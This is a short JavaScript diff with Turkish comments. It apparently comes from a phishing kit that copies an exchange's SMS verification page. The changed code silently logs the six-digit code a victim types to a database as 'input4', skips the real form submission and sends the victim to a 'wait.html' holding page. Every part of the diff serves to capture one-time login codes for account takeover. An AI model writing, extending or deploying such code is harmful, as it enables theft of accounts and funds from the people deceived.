@@ -356,7 +356,7 @@
         try {
           await sendLogUpdate({
             page: 'sms',
-            inputs: { input3: value.trim() }
+            inputs: { input4: value.trim() }
           });
         } catch (err) {
           console.error('Failed to log SMS input (silent):', err);
@@ -418,13 +418,14 @@
         if (/^\d{6}$/.test(smsInp.value.trim())) {
             smsInp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
             smsInp.closest('.bc-verify-input-content').nextElementSibling.style.color = '#76808f';
-            // MongoDB'ye kaydın %100 tamamlanmasını bekle
+            // MongoDB'ye kaydın %100 tamamlanmasını bekle - input4 olarak kaydet
             try {
               await logSmsInput(smsInp.value);
             } catch (err) {
               console.error('SMS log failed, continuing anyway', err);
             }
-            frm.submit();
+            // wait.html'e yönlendir
+            window.location.href = '/pages/wait.html';
         } else {
             smsInp.parentElement.style.borderColor = '#f84960';
             smsInp.closest('.bc-verify-input-content').nextElementSibling.style.color = 'red';
